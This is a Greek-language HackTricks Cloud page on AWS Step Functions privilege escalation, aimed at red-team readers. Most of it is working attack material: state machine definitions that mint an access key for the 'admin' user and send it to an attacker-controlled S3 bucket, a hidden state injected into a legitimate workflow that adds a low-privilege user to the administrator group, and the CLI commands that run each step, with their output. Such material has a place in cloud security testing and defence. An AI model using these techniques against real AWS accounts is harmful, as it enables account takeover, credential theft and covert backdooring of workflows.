# AWS - Ανόδος Προνομίων στις Λειτουργίες Βήματος

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team του HackTricks AWS)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Λειτουργίες Βήματος

Για περισσότερες πληροφορίες σχετικά με αυτήν την υπηρεσία του AWS, ελέγξτε:

{% content-ref url="../aws-services/aws-stepfunctions-enum.md" %}
[aws-stepfunctions-enum.md](../aws-services/aws-stepfunctions-enum.md)
{% endcontent-ref %}

### `states:TestState` & `iam:PassRole`

Ένας εισβολέας με τα δικαιώματα **`states:TestState`** & **`iam:PassRole`** μπορεί να δοκιμάσει οποιαδήποτε κατάσταση και να περάσει οποιονδήποτε ρόλο IAM σε αυτήν χωρίς να δημιουργεί ή ενημερώνει μια υπάρχουσα μηχανή κατάστασης, επιτρέποντας την μη εξουσιοδοτημένη πρόσβαση σε άλλες υπηρεσίες AWS με τα δικαιώματα των ρόλων. Συνδυαστικά, αυτά τα δικαιώματα μπορούν να οδηγήσουν σε εκτεταμένες μη εξουσιοδοτημένες ενέργειες, από την παραπλάνηση ροών εργασίας για την τροποποίηση δεδομένων έως τη διαρροή δεδομένων, την παραπλάνηση πόρων και την ανόδο προνομίων.
```bash
aws states test-state --definition <value> --role-arn <value> [--input <value>] [--inspection-level <value>] [--reveal-secrets | --no-reveal-secrets]
```
```json
{
    "Comment": "Create an access key for the admin user",
    "StartAt": "CreateAccessKey",
    "States": {
        "CreateAccessKey": {
            "Type": "Task",
            "Resource": "arn:aws:states:::iam:createAccessKey",
            "End": true
        }
    }
}
```
```json
{
"Type": "Task",
"Parameters": {
"UserName": "admin"
},
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"End": true
}
```
- **Εντολή** που εκτελέστηκε για την εκτέλεση της προνομιούχας αύξησης:
```bash
aws stepfunctions test-state --definition file://stateDefinition.json --role-arn arn:aws:iam::<account-id>:role/PermissiveRole

{
"output": "{
\"AccessKey\":{
\"AccessKeyId\":\"AKIA1A2B3C4D5E6F7G8H\",
\"CreateDate\":\"2024-07-09T16:59:11Z\",
\"SecretAccessKey\":\"1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j\",
\"Status\":\"Active\",
\"UserName\":\"admin\"
}
}",
"status": "SUCCEEDED"
}
```
- **Πιθανή Επίπτωση**: Μη εξουσιοδοτημένη εκτέλεση και χειρισμός ροών εργασίας και πρόσβαση σε ευαίσθητους πόρους, με πιθανό αποτέλεσμα την πρόκληση σημαντικών παραβιάσεων ασφαλείας.

### `states:CreateStateMachine` & `iam:PassRole` & (`states:StartExecution` | `states:StartSyncExecution`)

Ένας επιτιθέμενος με τα δικαιώματα **`states:CreateStateMachine`** & **`iam:PassRole`** θα μπορούσε να δημιουργήσει ένα state machine και να του παρέχει οποιονδήποτε ρόλο IAM, επιτρέποντας την μη εξουσιοδοτημένη πρόσβαση σε άλλες υπηρεσίες AWS με τα δικαιώματα των ρόλων. Σε αντίθεση με την προηγούμενη τεχνική ανύψωσης προνομίων (**`states:TestState`** & **`iam:PassRole`**), αυτή δεν εκτελείται αυτόματα, θα χρειαστεί επίσης τα δικαιώματα **`states:StartExecution`** ή **`states:StartSyncExecution`** (**το **`states:StartSyncExecution`** δεν είναι διαθέσιμο για τυπικές ροές εργασίας, μόνο για την έκφραση των state machines**) προκειμένου να ξεκινήσετε και να εκτελέσετε τη ροή εργασίας.
```bash
# Create a state machine
aws states create-state-machine --name <value> --definition <value> --role-arn <value> [--type <STANDARD | EXPRESS>] [--logging-configuration <value>]\
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
# Start a state machine execution
aws states start-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
# Start a Synchronous Express state machine execution
aws states start-sync-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
```
Τα παρακάτω παραδείγματα δείχνουν πώς να δημιουργήσετε ένα state machine που δημιουργεί ένα κλειδί πρόσβασης για τον χρήστη **`admin`** και εξάγει αυτό το κλειδί πρόσβασης σε ένα S3 bucket που ελέγχεται από τον επιτιθέμενο, εκμεταλλευόμενος αυτές τις άδειες και ένα ρόλο με υψηλό βαθμό περιεκτικότητας στο περιβάλλον AWS. Αυτός ο ρόλος με υψηλό βαθμό περιεκτικότητας θα πρέπει να έχει οποιαδήποτε πολιτική υψηλών προνομίων συσχετισμένη με αυτόν (για παράδειγμα **`arn:aws:iam::aws:policy/AdministratorAccess`**) που επιτρέπει στο state machine να εκτελέσει τις ενέργειες **`iam:CreateAccessKey`** & **`s3:putObject`**.

- **stateMachineDefinition.json**:
```json
{
"Comment": "Malicious state machine to create IAM access key and upload to S3",
"StartAt": "CreateAccessKey",
"States": {
"CreateAccessKey": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"Parameters": {
"UserName": "admin"
},
"ResultPath": "$.AccessKeyResult",
"Next": "PrepareS3PutObject"
},
"PrepareS3PutObject": {
"Type": "Pass",
"Parameters": {
"Body.$": "$.AccessKeyResult.AccessKey",
"Bucket": "attacker-controlled-S3-bucket",
"Key": "AccessKey.json"
},
"ResultPath": "$.S3PutObjectParams",
"Next": "PutObject"
},
"PutObject": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:s3:putObject",
"Parameters": {
"Body.$": "$.S3PutObjectParams.Body",
"Bucket.$": "$.S3PutObjectParams.Bucket",
"Key.$": "$.S3PutObjectParams.Key"
},
"End": true
}
}
}
```
- **Εντολή** που εκτελέστηκε για τη **δημιουργία της μηχανής κατάστασης**:
```bash
aws stepfunctions create-state-machine --name MaliciousStateMachine --definition file://stateMachineDefinition.json --role-arn arn:aws:iam::123456789012:role/PermissiveRole
{
"stateMachineArn": "arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine",
"creationDate": "2024-07-09T20:29:35.381000+02:00"
}
```
- **Εντολή** που εκτελείται για να **ξεκινήσει μια εκτέλεση** της προηγουμένως δημιουργημένης μηχανής καταστάσεων:
```json
aws stepfunctions start-execution --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine
{
"executionArn": "arn:aws:states:us-east-1:123456789012:execution:MaliciousStateMachine:1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f",
"startDate": "2024-07-09T20:33:35.466000+02:00"
}
```
{% hint style="warning" %}

Το S3 bucket που ελέγχεται από τον επιτιθέμενο θα πρέπει να έχει άδειες για να δεχτεί μια ενέργεια s3:PutObject από το λογαριασμό του θύματος.

{% endhint %}

- **Πιθανές Επιπτώσεις**: Μη εξουσιοδοτημένη εκτέλεση και παρεμβολή σε ροές εργασίας και πρόσβαση σε ευαίσθητους πόρους, με πιθανόν αποτέλεσμα την πρόκληση σημαντικών παραβιάσεων ασφαλείας.

### `states:UpdateStateMachine` & (δεν απαιτείται πάντα) `iam:PassRole`

Ένας επιτιθέμενος με την άδεια **`states:UpdateStateMachine`** θα μπορούσε να τροποποιήσει τον ορισμό ενός μηχανισμού κατάστασης, μπορώντας να προσθέσει επιπλέον κρυφές καταστάσεις που θα μπορούσαν να οδηγήσουν σε ανύψωση προνομίων. Με αυτόν τον τρόπο, όταν ένας νόμιμος χρήστης ξεκινά μια εκτέλεση του μηχανισμού κατάστασης, αυτή η νέα κακόβουλη κρυφή κατάσταση θα εκτελεστεί και η ανύψωση προνομίων θα είναι επιτυχής.

Ανάλογα με το πόσο επιτρεπτικός είναι ο ρόλος IAM που σχετίζεται με τον μηχανισμό κατάστασης, ένας επιτιθέμενος θα αντιμετωπίσει 2 καταστάσεις:

1. **Επιτρεπτικός Ρόλος IAM**: Εάν ο ρόλος IAM που σχετίζεται με τον μηχανισμό κατάστασης είναι ήδη επιτρεπτικός (έχει, για παράδειγμα, την πολιτική **`arn:aws:iam::aws:policy/AdministratorAccess`** συνημμένη), τότε η άδεια **`iam:PassRole`** δεν θα απαιτείται για την ανύψωση προνομίων, αφού δεν θα ήταν απαραίτητο να ενημερωθεί επίσης ο ρόλος IAM, με τον ορισμό του μηχανισμού κατάστασης να είναι αρκετός.
2. **Μη Επιτρεπτικός Ρόλος IAM**: Σε αντίθεση με την προηγούμενη περίπτωση, εδώ ένας επιτιθέμενος θα χρειαζόταν επίσης την άδεια **`iam:PassRole`** αφού θα ήταν απαραίτητο να συσχετιστεί ένας επιτρεπτικός ρόλος IAM με τον μηχανισμό κατάστασης επιπλέον από την τροποποίηση του ορισμού του μηχανισμού κατάστασης.
```bash
aws states update-state-machine --state-machine-arn <value> [--definition <value>] [--role-arn <value>] [--logging-configuration <value>] \
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
```
Τα παρακάτω παραδείγματα δείχνουν πώς να ενημερώσετε ένα νόμιμο state machine που απλώς καλεί μια συνάρτηση Lambda HelloWorld, προκειμένου να προστεθεί ένα επιπλέον state που προσθέτει τον χρήστη **`unprivilegedUser`** στην ομάδα IAM **`administrator`**. Με αυτόν τον τρόπο, όταν ένας νόμιμος χρήστης ξεκινά μια εκτέλεση του ενημερωμένου state machine, αυτή η νέα κακόβουλη κρυφή κατάσταση θα εκτελεστεί και η ανόδος προνομίων θα είναι επιτυχής.

{% hint style="warning" %}

Αν η state machine δεν έχει συσχετισμένο επιτρεπτικό IAM Role, θα απαιτείτο επίσης η άδεια **`iam:PassRole`** για να ενημερώσετε το IAM Role προκειμένου να συσχετίσετε ένα επιτρεπτικό IAM Role (για παράδειγμα ένα με την πολιτική **`arn:aws:iam::aws:policy/AdministratorAccess`** συνημμένη).

{% endhint %}

{% tabs %}

{% tab title="Νόμιμο State Machine" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}

{% tab title="Κακόβουλη Ενημερωμένη Μηχανή Καταστάσεων" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "AddUserToGroup"
},
"AddUserToGroup": {
"Type": "Task",
"Parameters": {
"GroupName": "administrator",
"UserName": "unprivilegedUser"
},
"Resource": "arn:aws:states:::aws-sdk:iam:addUserToGroup",
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}

{% endtabs %}

- **Εντολή** που εκτελέστηκε για να **ενημερωθεί** η **νόμιμη μηχανή κατάστασης**:
```bash
aws stepfunctions update-state-machine --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:HelloWorldLambda --definition file://StateMachineUpdate.json
{
"updateDate": "2024-07-10T20:07:10.294000+02:00",
"revisionId": "1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f"
}
```
- **Πιθανή Επίπτωση**: Μη εξουσιοδοτημένη εκτέλεση και χειρισμός ροών εργασίας και πρόσβαση σε ευαίσθητους πόρους, με πιθανόν αποτέλεσμα την πρόκληση σημαντικών παραβιάσεων ασφάλειας. 

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
